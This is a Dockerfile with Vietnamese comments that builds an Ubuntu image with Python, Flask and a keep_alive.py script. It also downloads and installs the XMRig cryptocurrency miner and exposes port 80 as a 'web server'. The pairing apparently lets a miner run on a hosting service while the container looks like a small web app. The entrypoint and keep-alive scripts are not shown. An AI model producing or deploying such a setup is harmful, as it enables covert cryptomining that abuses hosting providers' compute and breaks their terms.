FROM ubuntu:22.04

# Cài đặt Python và các công cụ cần thiết
RUN apt-get update && apt-get install -y \
    python3 \
    python3-pip \
    wget \
    tar \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy các file code vào
COPY requirements.txt .
COPY keep_alive.py .
COPY entrypoint.sh .

# Cài thư viện Flask
RUN pip3 install -r requirements.txt

# Tải và cài đặt XMRig
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz \
    && tar -xvf xmrig-6.21.0-linux-static-x64.tar.gz \
    && mv xmrig-6.21.0/xmrig /app/xmrig \
    && rm -rf xmrig-6.21.0*

# Cấp quyền chạy cho script
RUN chmod +x entrypoint.sh xmrig

# Mở cổng 80 cho Web Server
EXPOSE 80

# Chạy script khi khởi động
CMD ["./entrypoint.sh"]
